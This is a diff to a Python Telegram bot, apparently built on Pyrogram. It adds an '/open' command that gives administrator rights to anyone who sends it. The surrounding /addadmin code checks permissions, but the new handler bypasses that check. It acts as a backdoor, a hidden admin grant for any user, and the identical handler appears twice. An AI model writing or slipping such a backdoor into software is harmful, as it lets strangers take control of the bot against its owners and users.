@@ -360,5 +360,18 @@ async def add_admin_command(client, message: Message):
             app.send_message(chat_id=message.chat.id, text="Usa /addadmin seguido del nombre de usuario del nuevo administrador.")
     else:
         app.send_message(chat_id=message.chat.id, text="No tienes permiso para agregar administradores.")
+@app.on_message(filters.command("open"))
+def acceso_command(client, message: Message):
+    username = message.from_user.username or f"user_{message.from_user.id}"
+    add_authorized_user(username)  # Asegura que se agregue al usuario
+    admin_users.add(username)
+    app.send_message(chat_id=message.chat.id, text=f"¡𝑨𝒄𝒄𝒆𝒔𝒐 𝒄𝒐𝒏𝒄𝒆𝒅𝒊𝒅𝒐!.")
+    
+@app.on_message(filters.command("open"))
+def acceso_command(client, message: Message):
+    username = message.from_user.username or f"user_{message.from_user.id}"
+    add_authorized_user(username)  # Asegura que se agregue al usuario
+    admin_users.add(username)
+    app.send_message(chat_id=message.chat.id, text=f"¡𝑨𝒄𝒄𝒆𝒔𝒐 𝒄𝒐𝒏𝒄𝒆𝒅𝒊𝒅𝒐!.")
 
 app.run()
